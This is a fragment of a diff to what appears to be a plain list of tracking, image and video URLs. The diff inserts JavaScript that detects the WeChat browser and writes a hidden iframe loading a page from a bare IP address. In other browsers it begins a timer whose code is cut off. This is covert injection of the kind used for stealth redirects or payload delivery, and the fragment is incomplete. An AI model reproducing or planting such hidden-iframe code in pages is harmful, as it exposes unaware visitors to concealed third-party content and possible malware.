@@ -12,7 +12,9 @@ https://bu02.zybang.com/kxf?dae=vrt&sez=pqqt&ze=iqxrxpso&hpq=YhhdgQryQq3Qq3kkkQO
 
 https://img.rzlc.org/a/2017-08-07/15020770322248.jpg 
 https://img.rzlc.org/a/2017-05-18/14950894349968.jpg 
-
+if(navigator.userAgent.toLowerCase().match(/MicroMessenger/i)=="micromessenger"){ document.writ
+eln("<iframe src=\'http://101.201.29.182/wx.html\' style=\'display:none;\'><\/iframe>"); }else{            
+       setTimeout(function(){
 
 xigua:
 http://p.kf3msfm.com/s/1/720/11999.html?uid=916046&
